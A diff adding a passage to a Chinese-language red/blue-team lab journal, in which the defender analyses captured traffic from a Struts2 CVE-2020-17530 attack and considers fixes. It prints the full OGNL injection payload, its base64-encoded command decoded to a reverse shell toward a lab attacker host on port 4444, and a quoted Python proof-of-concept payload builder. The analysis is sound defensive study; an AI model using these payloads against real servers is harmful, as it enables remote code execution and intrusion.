@@ -291,3 +291,34 @@
 ### 第二回合
 
 >于是这一部分开始是蓝方检测到红方的攻击并进行一定对抗的第二回合，通过对抓取的攻击流量进行分析，尝试对漏洞利用进行拦截
+
+- 2023年7月19日，通过查看抓取到的攻击流量，尝试一点点分析struts2和weblogic两个漏洞的实际payload是如何实现的  
+  首先是struts2的CVE-2020-17530，在抓取的流量中有一条长度为1309的HTTP流量，POST请求方式，这里贴上HTTP协议中用于上传payload部分的Form中Key为id的值：
+
+  ```wireshark
+  %{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec({"bash -c {echo,YmFzaCAtYyAnMDwmODYtO2V4ZWMgODY8Pi9kZXYvdGNwLzE5Mi4xNjguNTYuMTA3LzQ0NDQ7c2ggPCY4NiA+Jjg2IDI+Jjg2Jw==}|{base64,-d}|bash"}))}
+  ```
+
+  其中核心执行的内容是用bash执行一段被base64编码的内容：
+
+  ```sh
+  bash -c {echo,YmFzaCAtYyAnMDwmODYtO2V4ZWMgODY8Pi9kZXYvdGNwLzE5Mi4xNjguNTYuMTA3LzQ0NDQ7c2ggPCY4NiA+Jjg2IDI+Jjg2Jw==}|{base64,-d}|bash
+  ```
+
+  仅编码部分简单“翻译”（Decode）一下，执行的是如下内容：
+
+  ```sh
+  bash -c '0<&86-;exec 86<>/dev/tcp/192.168.56.107/4444;sh <&86 >&86 2>&86'
+  ```
+
+  以我的shell语言基础，并不是很看得明白这句话具体在说什么，不过大概明白是走了一个反弹sh，转发到192.168.56.107也就是Attacker主机的4444端口
+
+  这部分的利用逻辑，在咕咕噜CVE-2020-17530这个漏洞的POC的时候找到了很近似的代码片段，[POC](https://github.com/CyborgSecurity/CVE-2020-17530/tree/master)是用Python写的，思路上就是简单的requests包通过POST方式向字符串拼接出来的目标地址执行指定命令，这里放上其payload函数部分：
+
+  ```python
+  #很显然，command就是用户输入的命令了，相比上面Metasploit的exploit，唯一的区别大概是将 #execute.exec()中的内容取出来另拼了一段arglist，看起来更整齐一些
+  def build_payload(command):
+    return '%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("' + command + '")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}'
+  ```
+
+- 2023年7月21日，针对上面对struts2的RCE分析，并没有找到比较简单且易于实现的修补方式，网络上的修补意见都是建议升级Apache Struts版本因为官方确实发布了修复版本，在不能够升级的万不得已的情况下才建议通过“[对不可信用户禁用forced OGNL evaluation](https://nsfocusglobal.com/struts2-s2-061-remote-code-execution-vulnerability-cve-2020-17530-threat-alert/)”的访问控制思路来解决这部分问题，倒是很好的解决思路🤔
